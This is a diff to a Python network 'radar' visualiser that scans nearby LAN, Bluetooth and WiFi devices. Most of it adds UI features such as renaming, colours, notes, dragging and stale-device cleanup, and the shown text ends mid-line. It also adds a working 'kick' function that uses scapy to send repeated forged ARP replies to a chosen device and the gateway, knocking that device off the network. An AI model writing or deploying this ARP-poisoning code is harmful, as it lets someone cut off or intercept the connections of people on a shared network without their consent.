@@ -19,6 +19,13 @@ try:
 except ImportError:
     HAS_BLEAK = False
 
+try:
+    from scapy.all import ARP, Ether, send, sendp, getmacbyip, conf
+    conf.verb = 0
+    HAS_SCAPY = True
+except ImportError:
+    HAS_SCAPY = False
+
 # ─── CONFIG ──────────────────────────────────────────────────────────────────
 SCREEN_W, SCREEN_H = 1000, 750
 RADAR_CENTER = (SCREEN_W // 2, SCREEN_H // 2)
@@ -27,6 +34,9 @@ FPS = 60
 SWEEP_SPEED = 1.2
 SCAN_INTERVAL = 15
 BT_SCAN_INTERVAL = 10
+DEVICE_TIMEOUT_NET = 45
+DEVICE_TIMEOUT_BT = 30
+DEVICE_TIMEOUT_WIFI = 40
 
 # ─── COLORS ──────────────────────────────────────────────────────────────────
 BLACK = (0, 0, 0)
@@ -57,6 +67,19 @@ PURPLE = (180, 80, 255)
 DIM_PURPLE = (80, 40, 120)
 BRIGHT_PURPLE = (220, 140, 255)
 WIFI_SCAN_INTERVAL = 20
+
+COLOR_PRESETS = [
+    ("Default", None),
+    ("Red", (255, 60, 60)),
+    ("Amber", (255, 180, 0)),
+    ("Cyan", (0, 200, 255)),
+    ("Purple", (180, 80, 255)),
+    ("Orange", (255, 120, 0)),
+    ("Yellow", (255, 255, 0)),
+    ("White", (255, 255, 255)),
+    ("Pink", (255, 100, 200)),
+    ("Blue", (80, 160, 255)),
+]
 
 SAMPLE_RATE = 44100
 
@@ -295,8 +318,25 @@ class NetworkScanner:
         self.devices = {}
         self.my_ip = self._get_my_ip()
         self.subnet = self._get_subnet()
+        self.gateway_ip = self._get_gateway_ip()
+        self.gateway_mac = None
         self.scanning = False
         self.last_scan = 0
+
+    def _get_gateway_ip(self):
+        try:
+            result = subprocess.run(
+                ["ipconfig"], capture_output=True, text=True,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+            )
+            for line in result.stdout.splitlines():
+                if "Default Gateway" in line:
+                    match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
+                    if match:
+                        return match.group(1)
+        except Exception:
+            pass
+        return None
 
     def _get_my_ip(self):
         try:
@@ -378,6 +418,8 @@ class NetworkScanner:
                 else:
                     self.devices[mac].ip = ip
                     self.devices[mac].last_seen = time.time()
+                if self.gateway_ip and ip == self.gateway_ip:
+                    self.gateway_mac = mac.replace("-", ":").upper()
             self.scanning = False
             self.last_scan = time.time()
 
@@ -737,6 +779,18 @@ class UAVRadar:
         self._prev_net_macs = set()
         self._prev_bt_addrs = set()
 
+        self.device_aliases = {}
+        self.device_colors = {}
+        self.device_custom_pos = {}
+        self.kicked_devices = {}
+        self._kick_threads = {}
+        self.text_input_active = False
+        self.text_input_buffer = ""
+        self.text_input_prompt = ""
+        self.text_input_action = None
+        self.dragging_id = None
+        self.dragging_type = None
+
         self.vignette = build_vignette(SCREEN_W, SCREEN_H)
         self.scanlines = build_scanlines(SCREEN_W, SCREEN_H, spacing=2, alpha=18)
         self.sweep_surface = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
@@ -768,6 +822,23 @@ class UAVRadar:
             for event in pygame.event.get():
                 if event.type == pygame.QUIT:
                     running = False
+
+                if self.text_input_active:
+                    if event.type == pygame.KEYDOWN:
+                        if event.key == pygame.K_RETURN:
+                            self._finish_text_input()
+                        elif event.key == pygame.K_ESCAPE:
+                            self.text_input_active = False
+                            self.text_input_buffer = ""
+                            self.text_input_action = None
+                        elif event.key == pygame.K_BACKSPACE:
+                            self.text_input_buffer = self.text_input_buffer[:-1]
+                        else:
+                            ch = event.unicode
+                            if ch and len(self.text_input_buffer) < 40:
+                                self.text_input_buffer += ch
+                    continue
+
                 if event.type == pygame.KEYDOWN:
                     if event.key == pygame.K_ESCAPE:
                         running = False
@@ -802,14 +873,32 @@ class UAVRadar:
                         self._port_scan_selected()
                     if event.key == pygame.K_F12:
                         self._screenshot()
+                    if event.key == pygame.K_k:
+                        self._toggle_kick()
+                    if event.key == pygame.K_F2:
+                        self._start_rename()
+                    if event.key == pygame.K_F3:
+                        self._cycle_color()
+                    if event.key == pygame.K_F4:
+                        self._start_custom_tag()
                 if event.type == pygame.MOUSEBUTTONDOWN:
                     if event.button == 1:
-                        self._handle_click(event.pos)
+                        mods = pygame.key.get_mods()
+                        if mods & pygame.KMOD_SHIFT:
+                            self._start_drag(event.pos)
+                        else:
+                            self._handle_click(event.pos)
                     elif event.button == 3:
                         self._handle_click(event.pos)
                         self._cycle_tag()
+                if event.type == pygame.MOUSEBUTTONUP:
+                    if event.button == 1 and self.dragging_id is not None:
+                        self._stop_drag()
                 if event.type == pygame.MOUSEMOTION:
-                    self._handle_hover(event.pos)
+                    if self.dragging_id is not None:
+                        self._update_drag(event.pos)
+                    else:
+                        self._handle_hover(event.pos)
 
             self.sweep_angle += SWEEP_SPEED * dt
             lap = int(self.sweep_angle / (2 * math.pi))
@@ -838,6 +927,7 @@ class UAVRadar:
                 self.wifi_scanner.scan()
 
             self._check_new_devices()
+            self._cleanup_stale_devices()
 
             self.noise_timer += dt
             if self.noise_timer > 0.15:
@@ -847,6 +937,9 @@ class UAVRadar:
             self._draw(dt)
             pygame.display.flip()
 
+        for mac in list(self.kicked_devices.keys()):
+            self._unkick_device(mac)
+        time.sleep(0.5)
         pygame.quit()
         sys.exit()
 
@@ -858,7 +951,7 @@ class UAVRadar:
         for mac, dev in self.scanner.devices.items():
             if mac in self.hidden_devices:
                 continue
-            pos = dev.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+            pos = self._get_radar_pos(mac, dev)
             dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
             dist = math.sqrt(dx * dx + dy * dy)
             if dist < closest_dist:
@@ -870,7 +963,7 @@ class UAVRadar:
             for addr, dev in self.bt_scanner.devices.items():
                 if addr in self.hidden_devices:
                     continue
-                pos = dev.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+                pos = self._get_radar_pos(addr, dev)
                 dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                 dist = math.sqrt(dx * dx + dy * dy)
                 if dist < closest_dist:
@@ -882,7 +975,7 @@ class UAVRadar:
             for bssid, net in self.wifi_scanner.networks.items():
                 if bssid in self.hidden_devices:
                     continue
-                pos = net.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+                pos = self._get_radar_pos(bssid, net)
                 dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                 dist = math.sqrt(dx * dx + dy * dy)
                 if dist < closest_dist:
@@ -959,6 +1052,74 @@ class UAVRadar:
         self._prev_bt_addrs = current_bt
         self._prev_wifi_bssids = current_wifi
 
+    def _cleanup_stale_devices(self):
+        now = time.time()
+
+        stale_net = [
+            mac for mac, dev in self.scanner.devices.items()
+            if not dev.is_self and (now - dev.last_seen) > DEVICE_TIMEOUT_NET
+        ]
+        for mac in stale_net:
+            dev = self.scanner.devices[mac]
+            vendor = dev.vendor
+            name = dev.hostname or dev.ip
+            label = f"{name} ({vendor})" if vendor else name
+            self._log_event(f"NET- {label}")
+            self.alert_queue.append(("DEVICE LEFT", label, now, DIM_RED))
+            if mac in self.kicked_devices:
+                self._unkick_device(mac)
+            del self.scanner.devices[mac]
+            self.hidden_devices.discard(mac)
+            self.tagged_devices.pop(mac, None)
+            self.device_notes.pop(mac, None)
+            self.device_aliases.pop(mac, None)
+            self.device_colors.pop(mac, None)
+            self.device_custom_pos.pop(mac, None)
+            self.port_scan_results.pop(mac, None)
+            if self.selected_id == mac:
+                self.selected_id = None
+                self.selected_type = None
+            self.sound._known_macs.discard(mac)
+
+        stale_bt = [
+            addr for addr, dev in self.bt_scanner.devices.items()
+            if (now - dev.last_seen) > DEVICE_TIMEOUT_BT
+        ]
+        for addr in stale_bt:
+            dev = self.bt_scanner.devices[addr]
+            name = dev.display_name
+            self._log_event(f"BT- {name}")
+            self.alert_queue.append(("BT LEFT", name, now, DIM_CYAN))
+            del self.bt_scanner.devices[addr]
+            self.hidden_devices.discard(addr)
+            self.tagged_devices.pop(addr, None)
+            self.device_notes.pop(addr, None)
+            self.device_aliases.pop(addr, None)
+            self.device_colors.pop(addr, None)
+            self.device_custom_pos.pop(addr, None)
+            if self.selected_id == addr:
+                self.selected_id = None
+                self.selected_type = None
+
+        stale_wifi = [
+            bssid for bssid, net in self.wifi_scanner.networks.items()
+            if (now - net.last_seen) > DEVICE_TIMEOUT_WIFI
+        ]
+        for bssid in stale_wifi:
+            net = self.wifi_scanner.networks[bssid]
+            name = net.display_name
+            self._log_event(f"WiFi- {name}")
+            self.alert_queue.append(("WIFI LEFT", name, now, DIM_PURPLE))
+            del self.wifi_scanner.networks[bssid]
+            self.hidden_devices.discard(bssid)
+            self.tagged_devices.pop(bssid, None)
+            self.device_aliases.pop(bssid, None)
+            self.device_colors.pop(bssid, None)
+            self.device_custom_pos.pop(bssid, None)
+            if self.selected_id == bssid:
+                self.selected_id = None
+                self.selected_type = None
+
     def _port_scan_selected(self):
         if self.selected_id is None or self.selected_type != "net":
             return
@@ -1005,7 +1166,7 @@ class UAVRadar:
         for mac, dev in self.scanner.devices.items():
             if mac in self.hidden_devices:
                 continue
-            pos = dev.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+            pos = self._get_radar_pos(mac, dev)
             dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
             dist = math.sqrt(dx * dx + dy * dy)
             if dist < closest_dist:
@@ -1017,7 +1178,7 @@ class UAVRadar:
             for addr, dev in self.bt_scanner.devices.items():
                 if addr in self.hidden_devices:
                     continue
-                pos = dev.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+                pos = self._get_radar_pos(addr, dev)
                 dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                 dist = math.sqrt(dx * dx + dy * dy)
                 if dist < closest_dist:
@@ -1029,7 +1190,7 @@ class UAVRadar:
             for bssid, net in self.wifi_scanner.networks.items():
                 if bssid in self.hidden_devices:
                     continue
-                pos = net.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+                pos = self._get_radar_pos(bssid, net)
                 dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                 dist = math.sqrt(dx * dx + dy * dy)
                 if dist < closest_dist:
@@ -1110,8 +1271,217 @@ class UAVRadar:
             f.write(f"\nHidden devices: {len(self.hidden_devices)}\n")
         self.export_flash = time.time()
 
+    def _get_radar_pos(self, device_id, device):
+        if device_id in self.device_custom_pos:
+            angle, distance = self.device_custom_pos[device_id]
+            r = distance * RADAR_RADIUS
+            x = RADAR_CENTER[0] + r * math.cos(angle)
+            y = RADAR_CENTER[1] + r * math.sin(angle)
+            return int(x), int(y)
+        return device.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+
+    def _get_display_name(self, device_id, default_name):
+        return self.device_aliases.get(device_id, default_name)
+
+    def _get_device_color(self, device_id, default_color):
+        return self.device_colors.get(device_id, default_color)
+
+    def _start_rename(self):
+        if self.selected_id is None:
+            return
+        current = self.device_aliases.get(self.selected_id, "")
+        self.text_input_active = True
+        self.text_input_buffer = current
+        self.text_input_prompt = "RENAME DEVICE:"
+        self.text_input_action = "rename"
+
+    def _start_custom_tag(self):
+        if self.selected_id is None:
+            return
+        current = self.tagged_devices.get(self.selected_id, "")
+        self.text_input_active = True
+        self.text_input_buffer = current
+        self.text_input_prompt = "CUSTOM TAG:"
+        self.text_input_action = "tag"
+
+    def _cycle_color(self):
+        if self.selected_id is None:
+            return
+        current = self.device_colors.get(self.selected_id)
+        idx = 0
+        for i, (name, color) in enumerate(COLOR_PRESETS):
+            if color == current:
+                idx = i
+                break
+        idx = (idx + 1) % len(COLOR_PRESETS)
+        preset_name, preset_color = COLOR_PRESETS[idx]
+        if preset_color is None:
+            self.device_colors.pop(self.selected_id, None)
+        else:
+            self.device_colors[self.selected_id] = preset_color
+        self._log_event(f"Color -> {preset_name}")
+
+    def _start_drag(self, mouse_pos):
+        closest_id = None
+        closest_type = None
+        closest_dist = 22
+
+        for mac, dev in self.scanner.devices.items():
+            if mac in self.hidden_devices:
+                continue
+            pos = self._get_radar_pos(mac, dev)
+            dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
+            dist = math.sqrt(dx * dx + dy * dy)
+            if dist < closest_dist:
+                closest_dist = dist
+                closest_id = mac
+                closest_type = "net"
+
+        if self.show_bt:
+            for addr, dev in self.bt_scanner.devices.items():
+                if addr in self.hidden_devices:
+                    continue
+                pos = self._get_radar_pos(addr, dev)
+                dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
+                dist = math.sqrt(dx * dx + dy * dy)
+                if dist < closest_dist:
+                    closest_dist = dist
+                    closest_id = addr
+                    closest_type = "bt"
+
+        if self.show_wifi:
+            for bssid, net in self.wifi_scanner.networks.items():
+                if bssid in self.hidden_devices:
+                    continue
+                pos = self._get_radar_pos(bssid, net)
+                dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
+                dist = math.sqrt(dx * dx + dy * dy)
+                if dist < closest_dist:
+                    closest_dist = dist
+                    closest_id = bssid
+                    closest_type = "wifi"
+
+        if closest_id:
+            self.dragging_id = closest_id
+            self.dragging_type = closest_type
+            self.selected_id = closest_id
+            self.selected_type = closest_type
+
+    def _update_drag(self, mouse_pos):
+        if self.dragging_id is None:
+            return
+        dx = mouse_pos[0] - RADAR_CENTER[0]
+        dy = mouse_pos[1] - RADAR_CENTER[1]
+        angle = math.atan2(dy, dx)
+        dist = math.sqrt(dx * dx + dy * dy)
+        distance = min(1.0, max(0.0, dist / RADAR_RADIUS))
+        self.device_custom_pos[self.dragging_id] = (angle, distance)
+
+    def _stop_drag(self):
+        if self.dragging_id:
+            self._log_event(f"Moved device manually")
+        self.dragging_id = None
+        self.dragging_type = None
+
+    def _finish_text_input(self):
+        text = self.text_input_buffer.strip()
+        if self.text_input_action == "rename" and self.selected_id:
+            if text:
+                self.device_aliases[self.selected_id] = text
+                self._log_event(f"Renamed -> {text}")
+            else:
+                self.device_aliases.pop(self.selected_id, None)
+                self._log_event("Alias removed")
+        elif self.text_input_action == "note" and self.selected_id:
+            if text:
+                self.device_notes[self.selected_id] = text
+                self._log_event(f"Note: {text[:20]}")
+            else:
+                self.device_notes.pop(self.selected_id, None)
+                self._log_event("Note removed")
+        elif self.text_input_action == "tag" and self.selected_id:
+            if text:
+                self.tagged_devices[self.selected_id] = text.upper()
+                self._log_event(f"Tag -> {text.upper()}")
+            else:
+                self.tagged_devices.pop(self.selected_id, None)
+                self._log_event("Tag removed")
+        self.text_input_active = False
+        self.text_input_buffer = ""
+        self.text_input_action = None
+
+    def _toggle_kick(self):
+        if self.selected_id is None or self.selected_type != "net":
+            return
+        if self.selected_id not in self.scanner.devices:
+            return
+        dev = self.scanner.devices[self.selected_id]
+        if dev.is_self:
+            self._log_event("Cannot kick yourself")
+            return
+
+        if not HAS_SCAPY:
+            self._log_event("scapy not installed")
+            self.alert_queue.append(("ERROR", "pip install scapy", time.time(), RED))
+            return
+
+        gw_ip = self.scanner.gateway_ip
+        gw_mac = self.scanner.gateway_mac
+        if not gw_ip or not gw_mac:
+            self._log_event("Gateway not detected")
+            self.alert_queue.append(("ERROR", "Gateway not found", time.time(), RED))
+            return
+
+        mac = self.selected_id
+        if mac in self.kicked_devices:
+            self._unkick_device(mac)
+        else:
+            self._kick_device(mac, dev.ip, gw_ip, gw_mac)
+
+    def _kick_device(self, mac, target_ip, gateway_ip, gateway_mac):
+        target_mac_colons = mac.replace("-", ":").upper()
+        gateway_mac_clean = gateway_mac.replace("-", ":").upper()
+        self.kicked_devices[mac] = True
+        self._log_event(f"KICK {target_ip}")
+        self.alert_queue.append(("KICKED", f"{target_ip} disconnected", time.time(), RED))
+
+        def _arp_spoof():
+            try:
+                while self.kicked_devices.get(mac, False):
+                    send(ARP(op=2, pdst=target_ip, hwdst=target_mac_colons,
+                             psrc=gateway_ip), verbose=False)
+                    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac_clean,
+                             psrc=target_ip), verbose=False)
+                    time.sleep(0.5)
+                for _ in range(5):
+                    send(ARP(op=2, pdst=target_ip, hwdst=target_mac_colons,
+                             psrc=gateway_ip, hwsrc=gateway_mac_clean), verbose=False)
+                    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac_clean,
+                             psrc=target_ip, hwsrc=target_mac_colons), verbose=False)
+                    time.sleep(0.2)
+            except Exception as e:
+                self._log_event(f"Kick error: {str(e)[:25]}")
+
+        t = threading.Thread(target=_arp_spoof, daemon=True)
+        t.start()
+        self._kick_threads[mac] = t
+
+    def _unkick_device(self, mac):
+        if mac in self.kicked_devices:
+            del self.kicked_devices[mac]
+            dev = self.scanner.devices.get(mac)
+            ip = dev.ip if dev else "?"
+            self._log_event(f"UNKICK {ip}")
+            self.alert_queue.append(("RESTORED", f"{ip} reconnected", time.time(), GREEN))
+
     def _add_note(self):
-        pass
+        if self.selected_id is None:
+            return
+        current = self.device_notes.get(self.selected_id, "")
+        self.text_input_active = True
+        self.text_input_buffer = current
+        self.text_input_prompt = "DEVICE NOTE:"
+        self.text_input_action = "note"
 
     # ─── DRAWING ─────────────────────────────────────────────────────────────
 
@@ -1136,6 +1506,10 @@ class UAVRadar:
         self.screen.blit(self.scanlines, (0, 0))
         self.screen.blit(self.vignette, (0, 0))
         self._draw_corner_brackets()
+        if self.text_input_active:
+            self._draw_text_input()
+        if self.dragging_id is not None:
+            self._draw_drag_indicator()
 
     def _draw_corner_brackets(self):
         length = 30
@@ -1241,8 +1615,9 @@ class UAVRadar:
         for mac, dev in list(self.scanner.devices.items()):
             if mac in self.hidden_devices:
                 continue
-            pos = dev.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+            pos = self._get_radar_pos(mac, dev)
             is_selected = (mac == self.selected_id and self.selected_type == "net")
+            custom_color = self.device_colors.get(mac)
 
             angle_diff = (self.sweep_angle - dev.angle) % (2 * math.pi)
             pulse = max(0, 1.0 - angle_diff / 0.3) if angle_diff < 0.3 else 0
@@ -1271,24 +1646,30 @@ class UAVRadar:
                 pygame.draw.circle(self.screen, (60, 40, 0), pos, 8)
                 pygame.draw.circle(self.screen, AMBER, pos, 6)
                 pygame.draw.circle(self.screen, (255, 220, 100), pos, 3)
-                label = self.font_small.render("YOU", True, AMBER)
+                you_label = self._get_display_name(mac, "YOU")
+                label = self.font_small.render(you_label, True, custom_color or AMBER)
                 self.screen.blit(label, (pos[0] + 12, pos[1] - 6))
             else:
-                base_g = int((180 + 75 * pulse) * fade)
-                color = (0, min(255, base_g), 0)
+                if custom_color:
+                    color = custom_color
+                    glow_color = custom_color
+                else:
+                    base_g = int((180 + 75 * pulse) * fade)
+                    color = (0, min(255, base_g), 0)
+                    glow_color = (0, 255, 0)
                 size = 5 + int(3 * pulse)
 
                 glow_r = size + 8 + int(5 * pulse)
                 glow = pygame.Surface((glow_r * 2, glow_r * 2), pygame.SRCALPHA)
                 glow_a = int((35 + 65 * pulse) * fade)
-                pygame.draw.circle(glow, (0, 255, 0, glow_a), (glow_r, glow_r), glow_r)
+                pygame.draw.circle(glow, (*glow_color, glow_a), (glow_r, glow_r), glow_r)
                 if pulse > 0.3:
-                    pygame.draw.circle(glow, (0, 255, 0, int(20 * pulse)), (glow_r, glow_r), glow_r + 4)
+                    pygame.draw.circle(glow, (*glow_color, int(20 * pulse)), (glow_r, glow_r), glow_r + 4)
                 self.screen.blit(glow, (pos[0] - glow_r, pos[1] - glow_r))
 
                 pygame.draw.circle(self.screen, color, pos, size)
                 inner_size = max(2, size - 2)
-                pygame.draw.circle(self.screen, (0, min(255, base_g + 40), 0), pos, inner_size)
+                pygame.draw.circle(self.screen, color, pos, inner_size)
 
                 tri = size + 3
                 points = [
@@ -1298,18 +1679,39 @@ class UAVRadar:
                 ]
                 pygame.draw.polygon(self.screen, color, points, 2)
 
-                name = dev.hostname[:18] if dev.hostname else dev.ip
-                label_g = int(min(255, (140 + 60 * pulse) * fade))
-                label = self.font_small.render(name, True, (0, label_g, 0))
+                default_name = dev.hostname[:18] if dev.hostname else dev.ip
+                name = self._get_display_name(mac, default_name)
+                label_color = custom_color if custom_color else (0, int(min(255, (140 + 60 * pulse) * fade)), 0)
+                label = self.font_small.render(name, True, label_color)
                 self.screen.blit(label, (pos[0] + 14, pos[1] - 6))
 
                 dtype = dev.device_type
                 if dtype:
-                    dt_surf = self.font_tiny.render(dtype, True, DIM_GREEN)
+                    dt_surf = self.font_tiny.render(dtype, True, custom_color or DIM_GREEN)
                     self.screen.blit(dt_surf, (pos[0] + 14, pos[1] + 8))
 
+            note = self.device_notes.get(mac)
+            if note:
+                note_surf = self.font_tiny.render(f'"{note[:20]}"', True, DIM_AMBER)
+                self.screen.blit(note_surf, (pos[0] + 14, pos[1] + 22))
+
+            is_kicked = mac in self.kicked_devices
+            if is_kicked and int(now * 4) % 2 == 0:
+                kick_surf = self.font_tiny.render("BLOCKED", True, RED)
+                kick_bg = pygame.Surface((kick_surf.get_width() + 4, kick_surf.get_height() + 2), pygame.SRCALPHA)
+                kick_bg.fill((60, 0, 0, 200))
+                self.screen.blit(kick_bg, (pos[0] - 26, pos[1] - 26))
+                self.screen.blit(kick_surf, (pos[0] - 24, pos[1] - 25))
+                cross_size = 12
+                cross_surf = pygame.Surface((cross_size * 2, cross_size * 2), pygame.SRCALPHA)
+                pygame.draw.line(cross_surf, (255, 0, 0, 180),
+                                 (0, 0), (cross_size * 2, cross_size * 2), 2)
+                pygame.draw.line(cross_surf, (255, 0, 0, 180),
+                                 (cross_size * 2, 0), (0, cross_size * 2), 2)
+                self.screen.blit(cross_surf, (pos[0] - cross_size, pos[1] - cross_size))
+
             is_new = (now - dev.first_seen) < 30
-            if is_new and int(now * 3) % 2 == 0:
+            if is_new and not is_kicked and int(now * 3) % 2 == 0:
                 new_surf = self.font_tiny.render("NEW", True, BRIGHT_GREEN)
                 bg = pygame.Surface((new_surf.get_width() + 4, new_surf.get_height() + 2), pygame.SRCALPHA)
                 bg.fill((0, 60, 0, 180))
@@ -1321,8 +1723,9 @@ class UAVRadar:
         for addr, dev in list(self.bt_scanner.devices.items()):
             if addr in self.hidden_devices:
                 continue
-            pos = dev.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+            pos = self._get_radar_pos(addr, dev)
             is_selected = (addr == self.selected_id and self.selected_type == "bt")
+            custom_color = self.device_colors.get(addr)
 
             angle_diff = (self.sweep_angle - dev.angle) % (2 * math.pi)
             pulse = max(0, 1.0 - angle_diff / 0.3) if angle_diff < 0.3 else 0
@@ -1340,7 +1743,10 @@ class UAVRadar:
                 tag_surf = self.font_tiny.render(tag, True, tc)
                 self.screen.blit(tag_surf, (pos[0] + 14, pos[1] + 24))
 
-            if dev.has_airdrop:
+            if custom_color:
+                base_color = custom_color
+                glow_color = custom_color
+            elif dev.has_airdrop:
                 base_color = APPLE_BLUE
                 glow_color = (80, 160, 255)
             elif dev.is_apple:
@@ -1367,18 +1773,20 @@ class UAVRadar:
             pygame.draw.polygon(self.screen, base_color, points, 2)
             pygame.draw.circle(self.screen, base_color, pos, size - 1)
 
-            label_parts = [dev.display_name[:16]]
+            default_name = dev.display_name[:16]
+            display_name = self._get_display_name(addr, default_name)
+            label_parts = [display_name]
             if dev.has_airdrop:
                 label_parts.append("[AirDrop]")
             elif dev.apple_services:
                 label_parts.append(f"[{dev.apple_services[0]}]")
             label_text = " ".join(label_parts)
-            label_color = BRIGHT_CYAN if pulse > 0 else CYAN
+            label_color = custom_color if custom_color else (BRIGHT_CYAN if pulse > 0 else CYAN)
             label = self.font_small.render(label_text, True, label_color)
             self.screen.blit(label, (pos[0] + 14, pos[1] - 6))
 
             if dev.rssi != 0:
-                rssi_text = self.font_tiny.render(f"{dev.rssi}dBm", True, DIM_CYAN)
+                rssi_text = self.font_tiny.render(f"{dev.rssi}dBm", True, custom_color or DIM_CYAN)
                 self.screen.blit(rssi_text, (pos[0] + 14, pos[1] + 8))
                 strength = max(0, min(4, int((100 + dev.rssi) / 20)))
                 bar_x = pos[0] + 14 + rssi_text.get_width() + 4
@@ -1387,6 +1795,11 @@ class UAVRadar:
                     h = 3 + b * 2
                     c = base_color if b < strength else (30, 30, 30)
                     pygame.draw.rect(self.screen, c, (bar_x + b * 5, bar_y + (10 - h), 3, h))
+
+            note = self.device_notes.get(addr)
+            if note:
+                note_surf = self.font_tiny.render(f'"{note[:20]}"', True, DIM_AMBER)
+                self.screen.blit(note_surf, (pos[0] + 14, pos[1] + 34))
 
             is_new = (now - dev.first_seen) < 30
             if is_new and int(now * 3) % 2 == 0:
@@ -1401,8 +1814,9 @@ class UAVRadar:
         for bssid, net in list(self.wifi_scanner.networks.items()):
             if bssid in self.hidden_devices:
                 continue
-            pos = net.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+            pos = self._get_radar_pos(bssid, net)
             is_selected = (bssid == self.selected_id and self.selected_type == "wifi")
+            custom_color = self.device_colors.get(bssid)
 
             angle_diff = (self.sweep_angle - net.angle) % (2 * math.pi)
             pulse = max(0, 1.0 - angle_diff / 0.3) if angle_diff < 0.3 else 0
@@ -1420,7 +1834,10 @@ class UAVRadar:
                 tag_surf = self.font_tiny.render(tag, True, tc)
                 self.screen.blit(tag_surf, (pos[0] + 14, pos[1] + 24))
 
-            if net.is_open:
+            if custom_color:
+                base_color = custom_color
+                glow_color = custom_color
+            elif net.is_open:
                 base_color = RED
                 glow_color = (255, 60, 60)
             else:
@@ -1442,23 +1859,26 @@ class UAVRadar:
             pygame.draw.circle(glow, (*glow_color, glow_a), (glow_r, glow_r), glow_r)
             self.screen.blit(glow, (pos[0] - glow_r, pos[1] - glow_r))
 
-            # WiFi icon: concentric arcs
             for arc_i in range(3):
                 arc_r = size + 2 + arc_i * 4
                 rect = pygame.Rect(pos[0] - arc_r, pos[1] - arc_r, arc_r * 2, arc_r * 2)
                 pygame.draw.arc(self.screen, base_color, rect, 0.3, 1.25, 2)
             pygame.draw.circle(self.screen, base_color, pos, size - 1)
 
-            label_text = net.display_name[:18]
+            default_name = net.display_name[:18]
+            label_text = self._get_display_name(bssid, default_name)
             if net.is_open:
                 label_text += " [OPEN]"
-            label_color = BRIGHT_PURPLE if pulse > 0 else PURPLE
-            if net.is_open:
+            if custom_color:
+                label_color = custom_color
+            elif net.is_open:
                 label_color = RED
+            else:
+                label_color = BRIGHT_PURPLE if pulse > 0 else PURPLE
             label = self.font_small.render(label_text, True, label_color)
             self.screen.blit(label, (pos[0] + 14, pos[1] - 6))
 
-            sig_text = self.font_tiny.render(f"{net.signal}% ch{net.channel}", True, DIM_PURPLE)
+            sig_text = self.font_tiny.render(f"{net.signal}% ch{net.channel}", True, custom_color or DIM_PURPLE)
             self.screen.blit(sig_text, (pos[0] + 14, pos[1] + 8))
             strength = max(0, min(4, net.signal // 25))
             bar_x = pos[0] + 14 + sig_text.get_width() + 4
@@ -1467,6 +1887,11 @@ class UAVRadar:
                 h = 3 + b * 2
                 c = base_color if b < strength else (30, 30, 30)
                 pygame.draw.rect(self.screen, c, (bar_x + b * 5, bar_y + (10 - h), 3, h))
+
+            note = self.device_notes.get(bssid)
+            if note:
+                note_surf = self.font_tiny.render(f'"{note[:20]}"', True, DIM_AMBER)
+                self.screen.blit(note_surf, (pos[0] + 14, pos[1] + 34))
 
             is_new = (now - net.first_seen) < 30
             if is_new and int(now * 3) % 2 == 0:
@@ -1490,14 +1915,17 @@ class UAVRadar:
         if dev is None:
             return
 
-        pos = dev.radar_pos(RADAR_CENTER, RADAR_RADIUS)
+        pos = self._get_radar_pos(self.selected_id, dev)
         dx = pos[0] - RADAR_CENTER[0]
         dy = pos[1] - RADAR_CENTER[1]
         dist = math.sqrt(dx * dx + dy * dy)
         if dist < 5:
             return
 
-        if self.selected_type == "bt":
+        custom_color = self.device_colors.get(self.selected_id)
+        if custom_color:
+            color = custom_color
+        elif self.selected_type == "bt":
             color = CYAN
         elif self.selected_type == "wifi":
             color = PURPLE
@@ -1698,6 +2126,8 @@ class UAVRadar:
             lines.append(("SEEN", f"{age}s ago (first: {first}s)", DIM_GREEN))
             if dev.is_self:
                 lines.append(("NOTE", "THIS IS YOU", AMBER))
+            if self.selected_id in self.kicked_devices:
+                lines.append(("STATUS", "BLOCKED / KICKED", RED))
             ps = self.port_scan_results.get(self.selected_id)
             if ps:
                 if ps["status"] == "scanning":
@@ -1754,8 +2184,28 @@ class UAVRadar:
             tc = {"KNOWN": GREEN, "SUSPECT": AMBER, "TARGET": RED}.get(tag, WHITE)
             lines.append(("TAG", tag, tc))
 
+        alias = self.device_aliases.get(self.selected_id)
+        if alias:
+            lines.append(("ALIAS", alias, BRIGHT_GREEN))
+
+        note = self.device_notes.get(self.selected_id)
+        if note:
+            lines.append(("NOTE", note[:25], DIM_AMBER))
+
+        custom_color = self.device_colors.get(self.selected_id)
+        if custom_color:
+            color_name = "Custom"
+            for cn, cv in COLOR_PRESETS:
+                if cv == custom_color:
+                    color_name = cn
+                    break
+            lines.append(("COLOR", color_name, custom_color))
+
+        if self.selected_id in self.device_custom_pos:
+            lines.append(("POS", "Custom (Shift+drag)", DIM_GREEN))
+
         panel_w = 290
-        panel_h = 38 + len(lines) * 20
+        panel_h = 52 + len(lines) * 20
         panel_x = 15
         panel_y = SCREEN_H - 65 - panel_h
 
@@ -1773,8 +2223,39 @@ class UAVRadar:
             self.screen.blit(key_surf, (panel_x + 12, y))
             self.screen.blit(val_surf, (panel_x + 60, y))
 
-        hint = self.font_tiny.render("[DEL/X] Hide  [T] Tag  [C] Clear", True, (0, 50, 0))
-        self.screen.blit(hint, (panel_x + 12, panel_y + panel_h - 14))
+        hint1 = self.font_tiny.render("[X]Del [T]Tag [F2]Name [N]Note [K]Kick", True, (0, 50, 0))
